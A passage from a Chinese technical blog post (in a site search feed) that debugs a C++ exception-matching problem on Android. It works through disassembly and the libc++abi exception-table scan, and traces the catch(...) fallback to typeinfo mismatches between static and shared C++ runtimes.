    1ae1:       e8 0a 01 00 00          call   1bf0 &lt;__cxa_end_catch@plt>
    1ae6:       31 c0                   xor    %eax,%eax
    1ae8:       48 83 c4 30             add    $0x30,%rsp
    1aec:       5d                      pop    %rbp
    1aed:       c3                      ret
    1aee:       48 8b 7d e8             mov    -0x18(%rbp),%rdi
    1af2:       e8 d9 00 00 00          call   1bd0 &lt;__cxa_begin_catch@plt>
    1af7:       48 8d 3d 66 ed ff ff    lea    -0x129a(%rip),%rdi        # 864 &lt;_IO_stdin_used+0x4>
    1afe:       31 c0                   xor    %eax,%eax
    1b00:       e8 db 00 00 00          call   1be0 &lt;printf@plt>
    1b05:       e9 00 00 00 00          jmp    1b0a &lt;main+0x9a>
    1b0a:       e8 e1 00 00 00          call   1bf0 &lt;__cxa_end_catch@plt>
    1b0f:       e9 d2 ff ff ff          jmp    1ae6 &lt;main+0x76>
    1b14:       48 89 c1                mov    %rax,%rcx
    1b17:       89 d0                   mov    %edx,%eax
    1b19:       48 89 4d e8             mov    %rcx,-0x18(%rbp)
    1b1d:       89 45 e4                mov    %eax,-0x1c(%rbp)
    1b20:       e8 cb 00 00 00          call   1bf0 &lt;__cxa_end_catch@plt>
    1b25:       e9 00 00 00 00          jmp    1b2a &lt;main+0xba>
    1b2a:       e9 1b 00 00 00          jmp    1b4a &lt;main+0xda>
    1b2f:       48 89 c1                mov    %rax,%rcx
    1b32:       89 d0                   mov    %edx,%eax
    1b34:       48 89 4d e8             mov    %rcx,-0x18(%rbp)
    1b38:       89 45 e4                mov    %eax,-0x1c(%rbp)
    1b3b:       e8 b0 00 00 00          call   1bf0 &lt;__cxa_end_catch@plt>
    1b40:       e9 00 00 00 00          jmp    1b45 &lt;main+0xd5>
    1b45:       e9 00 00 00 00          jmp    1b4a &lt;main+0xda>
    1b4a:       48 8b 7d e8             mov    -0x18(%rbp),%rdi
    1b4e:       e8 ad 00 00 00          call   1c00 &lt;_Unwind_Resume@plt>
    1b53:       48 89 c7                mov    %rax,%rdi
    1b56:       e8 05 00 00 00          call   1b60 &lt;__clang_call_terminate>
  当正常捕获异常时，cmp    %ecx,%eax位置的eax的值是2，正常进入异常分支。当异常捕获异常时，cmp    %ecx,%eax位置的eax的值是1，进入异常捕获分支。意味着在异常情况下：get_shim_type_info（scan_eh_tab中）返回值是0。（注意，第一次查找到了类型，但是不匹配，循环遍历链表下一此匹配到了catch(…)）
  上面是我们的猜测，我们直接重新构建libcxx/libcxxabi的debug版本，然后再构建我们的测试程序，然后在scan_eh_tab中我们得到了如下的图的核心结果：

    
        
    
   

    
        
    
   
  从上面可知，我们不同的构建方法，导致了cxx底层无法对两个class类型进行dynamic_cast，导致无法匹配，因此进入了catch(…)的代码段。有兴趣的人可以去追踪dynamic_cast的底层实现函数如下：
__dynamic_cast(const void *static_ptr, const __class_type_info *static_type,
               const __class_type_info *dst_type,
               std::ptrdiff_t src2dst_offset)
  也就是说，我们的核心原因就是__class_type_info在静态编译、动态编译不同情况下，虽然定义是一样的,当两个符号分别在libc++.so和libuser.so的不同符号的时候(地址不一样)，但是无法进行cast操作，这是合理的。




后记

  总的来说，上面的内容解答了如下两个问题：


为什么会捕获到异常：编译条件导致的android系统底层对某些api有不同的控制行为？


为什么符号都存在的情况下，走了不一样的异常捕获路径：核心在于typeinfo对象无法dynamic_cast


  此次问题调查，加深了我对stl_static/stl_shared的理解，同时加深了我对c++底层实现的了解。加深了我对gcc/clang等编译器的底层功能结构的了解。
  同时，根据这次折腾llvm源码的过程，下次再一次想了解c++底层的实现的话，会快捷、方便不少。
参考文献


https://itanium-cxx-abi.github.io/cxx-abi/abi-eh.html#cxx-throw


https://en.cppreference.com/w/cpp/filesystem/exists.html


https://developer.android.com/ndk/guides/cpp-support?hl=zh-cn#selecting_a_c_runtime


https://en.cppreference.com/w/cpp/language/throw.html







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Linux</category>
        <category>Android</category>
        <category>C++</category>
        <category>Exception</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Android</tag>
        <tag>Linux</tag>
        <tag>Exception</tag>
      </tags>
  </entry>
</search>
